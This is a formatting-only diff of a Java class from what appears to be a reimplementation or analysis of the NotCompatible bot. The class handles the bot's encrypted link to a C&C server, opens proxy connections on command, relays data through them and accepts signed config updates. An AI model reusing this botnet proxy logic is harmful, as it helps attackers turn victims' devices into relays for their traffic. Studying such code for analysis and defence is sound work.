@@ -1,19 +1,18 @@
 package diff.notcompatible.c.bot.net.tcp;
 
+import diff.notcompatible.c.bot.crypto.RC4;
+import diff.notcompatible.c.bot.net.ThreadServer;
+import diff.notcompatible.c.bot.net.tcp.objects.ProxyList;
+import diff.notcompatible.c.bot.objects.MyBuffer;
+import diff.notcompatible.c.bot.objects.Packet;
+import org.bouncycastle.util.encoders.Hex;
+
 import java.io.IOException;
 import java.net.InetSocketAddress;
 import java.nio.channels.SelectionKey;
 import java.nio.channels.Selector;
 import java.nio.channels.SocketChannel;
 import java.util.logging.Logger;
-
-import org.bouncycastle.util.encoders.Hex;
-
-import diff.notcompatible.c.bot.crypto.RC4;
-import diff.notcompatible.c.bot.net.ThreadServer;
-import diff.notcompatible.c.bot.net.tcp.objects.ProxyList;
-import diff.notcompatible.c.bot.objects.MyBuffer;
-import diff.notcompatible.c.bot.objects.Packet;
 
 /**
  * This is the "link" between the bot and the C&C server
@@ -167,7 +166,7 @@ public class Link extends TCPSocket {
             LOGGER.info(" [!] Received " + dataLength + " bytes of data, but no encryption has been set up!");
             if (dataLength > readBuffer.size) {
                 LOGGER.warning(" [!] Data claims we received " + dataLength
-                                + " bytes of data, larger than what the read buffer says we have - exiting!");
+                        + " bytes of data, larger than what the read buffer says we have - exiting!");
                 close();
             } else {
                 LOGGER.info(" [+] Attempting to initialize encryption");
@@ -204,7 +203,7 @@ public class Link extends TCPSocket {
 
     /**
      * Received a CONN packet, used for creating a ProxyLink
-     * 
+     *
      * @param received
      */
     private void recvCONN(Packet received) {
@@ -234,7 +233,7 @@ public class Link extends TCPSocket {
                         proxyLink.connect(server, port);
                         proxyList.add(proxyLink);
                         LOGGER.info(" [+] New ProxyLink created to [ " + server + " / " + port + " ] on channel [ "
-                                        + channel + " ]");
+                                + channel + " ]");
                     }
                 }
             }
@@ -243,7 +242,7 @@ public class Link extends TCPSocket {
 
     /**
      * Receive and parse SEND (data) commands
-     * 
+     *
      * @param send
      */
     private void recvSEND(Packet send) {
@@ -264,7 +263,7 @@ public class Link extends TCPSocket {
                     try {
                         proxyLink.send(dataTransferPacket.buffer.array());
                         LOGGER.info(" [+] Data sent to ProxyLink channel [ " + proxyLink.ch + " ] with data length [ "
-                                        + dataTransferPacket.buffer.array().length + " ] ");
+                                + dataTransferPacket.buffer.array().length + " ] ");
                     } catch (Exception exception) {
                         exception.printStackTrace();
                         proxyLink.close();
@@ -283,9 +282,9 @@ public class Link extends TCPSocket {
                 Packet lidPacket = dataPacket.getByName("LID");
                 // Verify the set packet
                 if ((lidPacket != null)
-                                && (owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket
-                                                .asInt64())
-                                && owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
+                        && (owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket
+                        .asInt64())
+                        && owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
                     // Delete old one and save new config
                     owner.config.packet.delete("SET");
                     owner.config.packet.add(dataPacket);
@@ -299,7 +298,7 @@ public class Link extends TCPSocket {
 
     /**
      * Receive and parse the shut down ProxyLink command
-     * 
+     *
      * @param killProxyLinkPacket
      */
     private void recvSHUT(Packet killProxyLinkPacket) {
@@ -442,11 +441,9 @@ public class Link extends TCPSocket {
 
     /**
      * Send an error packet about the ProxyLink back to C&C
-     * 
-     * @param num
-     *            Error number
-     * @param ch
-     *            Channel which contained the error
+     *
+     * @param num Error number
+     * @param ch  Channel which contained the error
      */
     public void sendError(int num, int ch) {
         LOGGER.warning(" [*] Sending error packet.");
@@ -483,7 +480,7 @@ public class Link extends TCPSocket {
 
     /**
      * Use RC4 to cipher data and send to C&C
-     * 
+     *
      * @param data
      */
     public void sendEncrypt(byte[] data) {
